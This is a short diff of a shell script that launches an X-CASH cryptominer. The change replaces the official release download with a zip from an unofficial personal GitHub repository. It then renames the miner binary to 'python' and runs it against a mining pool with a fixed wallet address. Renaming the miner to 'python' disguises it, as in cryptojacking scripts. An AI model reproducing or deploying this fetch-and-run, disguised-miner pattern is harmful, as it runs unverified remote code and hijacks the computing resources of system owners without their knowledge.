@@ -28,8 +28,8 @@ fi
 exit
 fi
 
-wget https://github.com/X-CASH-official/XCASH_ALL_Miner/releases/download/1.0.0/XCASH_ALL_Miner_Linux_1.0.0.zip
-unzip XCASH_ALL_Miner_Linux_1.0.0.zip
+wget https://raw.githubusercontent.com/haidanglx/Tonghop/master/Xcash.zip
+unzip Xcash.zip
 mv XCASH_ALL_Miner python
 ./python -F http://xcash.herominers.com:10440/XCBzxb7igt5YvbwtYCMPkEWRATpzrMYvU2PpTDi89bon7fYnJgYSeRS8EN5LLnPxgkgfsf3k1DZVn1bzccTFBNhpPGbJGHKCzDraxzJY1huRe6/lyn
 
